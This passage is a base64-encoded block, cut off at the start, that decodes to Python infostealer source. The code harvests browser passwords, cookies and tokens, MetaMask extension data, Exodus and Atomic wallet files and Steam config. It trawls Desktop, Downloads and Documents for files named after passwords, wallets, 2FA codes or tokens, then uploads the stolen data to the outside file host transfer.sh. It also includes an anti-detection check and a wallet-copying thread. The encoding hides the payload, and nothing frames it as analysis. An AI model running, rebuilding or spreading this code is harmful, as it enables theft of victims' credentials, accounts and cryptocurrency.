BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgcHJpbnQoemYpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6IHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICB1cGxvYWQoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKCgpkZWYgZ3JhYmJfR2F0aGVyQWxsKCk6CiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcKICAgIGJyb3dzZXJQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIE5lb24vVXNlciBEYXRhL0RlZmF1bHQiLCAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9CcmF2ZVNvZnR3YXJlL0JyYXZlLUJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgImJyYXZlLmV4ZSIsICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vTWljcm9zb2Z0L0VkZ2UvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICJlZGdlLmV4ZSIsICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0KICAgIF0KCgoKICAgIFBhdGhzX3ppcHBlZCA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLAogICAgICAgIFtmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIsICJFeG9kdXMuZXhlIiwgIldhbGxldCJdLAogICAgICAgIFsiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxjb25maWciLCAic3RlYW0uZXhlIiwgIlN0ZWFtIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXQogICAgXQoKCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFBhc3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIHRocmVhZF9iY2Nvb2tpZXMgPSBbXQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRDb29raWUsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRocmVhZF9iY2Nvb2tpZXMuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHJlYWRfYmNjb29raWVzOiB0aHJlYWQuam9pbigpCiAgICBERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCiAgICBpZiBERVRFQ1RFRCA9PSBUcnVlOiByZXR1cm4KCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkuc3RhcnQoKQoKICAgIGZvciBwYXR0IGluIFBhdGhzX3ppcHBlZDoKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCgogICAgZm9yIHRocmVhZCBpbiBUaHJlYWRsaXN0OgogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCB1cHRocwogICAgdXB0aHMgPSBbXQoKICAgIGZvciBmaWxlIGluIFsiYmNfYWxscGFzc3dvcmRzLnR4dCIsICJiY19hbGxjb29raWVzLnR4dCJdOgogICAgICAgIHVwbG9hZChvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKQoKCmRlZiBiY191cGxvYWRhbm9uZmlsZXMocGF0aCk6CiAgICB0cnk6CgogICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0KICAgICAgICAuLi4KICAgICAgICB1cGxvYWQgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3RyYW5zZmVyLnNoLyIsIGZpbGVzPWZpbGVzKQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0CiAgICAgICAgcmV0dXJuIHVybAogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIGJjX0ZvbGRlcl9jcmVhdGUocGF0aEYsIGtleXdvcmRzKToKICAgIGdsb2JhbCBiY19jcmVhdGVfZmlsZXMKICAgIG1heGZpbGVzcGVyZGlyID0gNwogICAgaSA9IDAKICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQogICAgZmZvdW5kID0gW10KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybgogICAgICAgIGkgKz0gMQogICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6CiAgICAgICAgICAgIHVybCA9IGJjX3VwbG9hZGFub25maWxlcyhwYXRoRiArICIvIiArIGZpbGUpCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawogICAgYmNfY3JlYXRlX2ZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQoKYmNfY3JlYXRlX2ZpbGVzID0gW10KZGVmIGJjX2NyZWF0ZV9maWxlKHBhdGgsIGtleXdvcmRzKToKICAgIGdsb2JhbCBiY19jcmVhdGVfZmlsZXMKICAgIGZpZm91bmQgPSBbXQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgZm9yIHdvcmYgaW4ga2V5d29yZHM6CiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCAiLnR4dCIgaW4gZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWZvdW5kLmFwcGVuZChbcGF0aCArICIvIiArIGZpbGUsIGJjX3VwbG9hZGFub25maWxlcyhwYXRoICsgIi8iICsgZmlsZSldKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToKICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwYXRoICsgIi8iICsgZmlsZQogICAgICAgICAgICAgICAgICAgIGJjX0ZvbGRlcl9jcmVhdGUodGFyZ2V0LCBrZXl3b3JkcykKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgIGJjX2NyZWF0ZV9maWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCmRlZiBiY19jaGVja2luZygpOgogICAgdXNlciA9IHRlbXAuc3BsaXQoIlxBcHBEYXRhIilbMF0KICAgIHBhdGgyc2VhcmNoID0gWwogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLAogICAgICAgIHVzZXIgKyAiL0Rvd25sb2FkcyIsCiAgICAgICAgdXNlciArICIvRG9jdW1lbnRzIgogICAgXQoKCgogICAga2V5X3dvcmRzRmlsZXMgPSBbCiAgICAgICAgInBhc3N3IiwKICAgICAgICAibWRwIiwKICAgICAgICAibW90ZGVwYXNzZSIsCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsCiAgICAgICAgImxvZ2luIiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBheXBhbCIsCiAgICAgICAgImJhbnF1ZSIsCiAgICAgICAgIm1ldGFtYXNrIiwKICAgICAgICAid2FsbGV0IiwKICAgICAgICAiY3J5cHRvIiwKICAgICAgICAiZXhvZHVzIiwKICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgIjJmYSIsCiAgICAgICAgImNvZGUiLAogICAgICAgICJtZW1vIiwKICAgICAgICAiY29tcHRlIiwKICAgICAgICAidG9rZW4iLAogICAgICAgICJiYWNrdXAiLAogICAgICAgICJzZWVjcmV0IgogICAgICAgIF0KCiAgICB3aWtpdGggPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6CiAgICAgICAgYmNfY2hlY2tpbmcgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1iY19jcmVhdGVfZmlsZSwgYXJncz1bcGF0dCwga2V5X3dvcmRzRmlsZXNdKTtiY19jaGVja2luZy5zdGFydCgpCiAgICAgICAgd2lraXRoLmFwcGVuZChiY19jaGVja2luZykKICAgIHJldHVybiB3aWtpdGgKCgpnbG9iYWwga2V5d29yZCwgY29va2lXb3JkcywgcGFzd1dvcmRzCgprZXl3b3JkID0gWwogICAgJ21haWwnLCAnW2NvaW5iYXNlXShodHRwczovL2NvaW5iYXNlLmNvbSknLCAnW3NlbGxpeF0oaHR0cHM6Ly9zZWxsaXguaW8pJywgJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJywgJ1tzdGVhbV0oaHR0cHM6Ly9zdGVhbS5jb20pJywgJ1tkaXNjb3JkXShodHRwczovL2Rpc2NvcmQuY29tKScsICdbcmlvdGdhbWVzXShodHRwczovL3Jpb3RnYW1lcy5jb20pJywgJ1t5b3V0dWJlXShodHRwczovL3lvdXR1YmUuY29tKScsICdbaW5zdGFncmFtXShodHRwczovL2luc3RhZ3JhbS5jb20pJywgJ1t0aWt0b2tdKGh0dHBzOi8vdGlrdG9rLmNvbSknLCAnW3R3aXR0ZXJdKGh0dHBzOi8vdHdpdHRlci5jb20pJywgJ1tmYWNlYm9va10oaHR0cHM6Ly9mYWNlYm9vay5jb20pJywgJ2NhcmQnLCAnW2VwaWNnYW1lc10oaHR0cHM6Ly9lcGljZ2FtZXMuY29tKScsICdbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSknLCAnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCAnW3JvYmxveF0oaHR0cHM6Ly9yb2Jsb3guY29tKScsICdbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pJywgJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCAnYmFuaycsICdbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pJywgJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCAnW2FtYXpvbl0oaHR0cHM6Ly9hbWF6b24uY29tKScsICdbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSknLCAnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywgJ1twbGF5c3RhdGlvbl0oaHR0cHM6Ly9wbGF5c3RhdGlvbi5jb20pJywgJ1toYm9dKGh0dHBzOi8vaGJvLmNvbSknLCAnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywgJ2J1eScsICdzZWxsJywgJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsICdbaG90bWFpbF0oaHR0cHM6Ly9ob3RtYWlsLmNvbSknLCAnW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pJywgJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywgJ1t0ZWxlZ3JhbV0oaHR0cHM6Ly90ZWxlZ3JhbS5jb20pJywgJ1twb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKScsICdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywgJ1tleHByZXNzdnBuXShodHRwczovL2V4cHJlc3N2cG4uY29tKScsICdjcnlwdG8nLCAnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywgJ1tuZXRmbGl4XShodHRwczovL25ldGZsaXguY29tKScKXQoKCmNvb2tpV29yZHMgPSBbXQpwYXN3V29yZHMgPSBbXQoKZ3JhYmJfR2F0aGVyQWxsKCkKREVURUNURUQgPSBUcnVzdChDb29raWVzKQoKaWYgbm90IERFVEVDVEVEOgogICAgd2lraXRoID0gYmNfY2hlY2tpbmcoKQoKICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOiB0aHJlYWQuam9pbigpCiAgICB0aW1lLnNsZWVwKDAuMikKCiAgICBmaWxldGV4dCA9ICJgYGBkaWZmXG4iCiAgICBmb3IgYXJnIGluIGJjX2NyZWF0ZV9maWxlczoKICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOgogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQogICAgICAgICAgICBmb2xkbGlzdCA9IGFyZ1syXQogICAgICAgICAgICBmaWxldGV4dCArPWYiXG4iCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLSB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIisgTmFtZToge2ZpbGVhbm1lfVxuKyBMaW5rOiB7Yn0iCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iCiAgICBmaWxldGV4dCArPSAiXG5gYGAiCgoKICAgIHVwbG9hZCgiYmNfY2hlY2tpbmciLCBmaWxldGV4dCkKICAgIGF1dG8gPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdXRvX2NvcHlfd2FsbGV0KCkucnVuKQogICAgYXV0by5zdGFydCgpCg==
